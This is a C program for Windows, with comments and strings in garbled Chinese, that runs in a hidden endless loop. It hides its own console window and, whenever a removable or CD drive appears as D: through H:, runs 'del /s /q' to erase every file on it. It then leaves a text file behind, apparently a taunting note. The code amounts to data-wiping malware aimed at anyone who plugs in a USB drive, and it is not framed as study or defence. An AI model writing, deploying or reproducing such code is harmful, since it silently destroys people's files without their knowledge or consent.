#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h> 
#include <io.h>
int main() {
    while (1) {

        Sleep(70);
        // ���ô��ڱ���
        SetConsoleTitle("U������-��������");
        HWND hwnd = FindWindow(NULL, "U������-��������");
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE); // ����������
        }
  
        //FILE* fil;

        //fil = fopen_s(&fil, "C://fuck.txt", "r");
        //if (fil != NULL) {
        //    MessageBox(NULL, L"�������˳�", L"��ʾ", MB_OK);
        //    fclose(fil);
        //    return 0;
        //}
        /*
        if (file != NULL) {
            printf("�ļ�����");
            MessageBox(NULL, "�������˳�", "��ʾ", MB_OK);
            fclose(file);
            exit(0);
        }*/
   

            if (GetDriveType("D:") != DRIVE_NO_ROOT_DIR) {
            char drive[] = "D:\\*.*"; // ��Ҫɾ����Ӳ���̷�������ͨ���
            UINT driveType = GetDriveType("D:");
            if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                printf("D��Ӳ�����ƶ�����\n"); // ɾ�����ƶ������µ������ļ�
                system("del /s /q D:\\*.*");
                FILE *file;
    			file = fopen("D:\\�����ɵ�.txt", "w");
            }
        }

            if (GetDriveType("E:") != DRIVE_NO_ROOT_DIR) 
			{
                char drive[] = "E:\\*.*"; // ��Ҫɾ����Ӳ���̷�������ͨ���
                UINT driveType = GetDriveType("E:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) 
				{
                    printf("E�̣���Ӳ�����ƶ�����\n");// ɾ�����ƶ������µ������ļ�
                    system("del /s /q E:\\*.*");
                    FILE *file;
    				file = fopen("E:\\�����ɵ�.txt", "w");
                }
                else {
                    printf("��Ӳ�̲����ƶ�����\n");
                }
            }

            if (GetDriveType("F:") != DRIVE_NO_ROOT_DIR) {
                UINT driveType = GetDriveType("F:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("F�̣���Ӳ�����ƶ�����\n");
                    system("del /s /q F:\\*.*");
                    FILE *file;
    				file = fopen("F:\\�����ɵ�.txt", "w");
                }
                else {
                    printf("��Ӳ�̲����ƶ�����\n");
                }
            }

            if (GetDriveType("G:") != DRIVE_NO_ROOT_DIR) {
                UINT driveType = GetDriveType("G:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("G��Ӳ�����ƶ�����\n");
                    system("del /s /q G:\\*.*");
                    FILE *file;
    				file = fopen("G:\\�����ɵ�.txt", "w");
                }
                else {
                    printf("��Ӳ�̲����ƶ�����\n");
                }
            }

            if (GetDriveType("H:") != DRIVE_NO_ROOT_DIR) {
                char drive[] = "H:\\*.*"; // ��Ҫɾ����Ӳ���̷�������ͨ���
                UINT driveType = GetDriveType("H:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("H��Ӳ�����ƶ�����\n");
                    system("del /s /q H:\\*.*");
                    FILE *file;
    				file = fopen("H:\\�����ɵ�.txt", "w");
                }
                else {
                    printf("��Ӳ�̲����ƶ�����\n");
                }
            }
        }

        //system("pause");
        return 0;
    
}
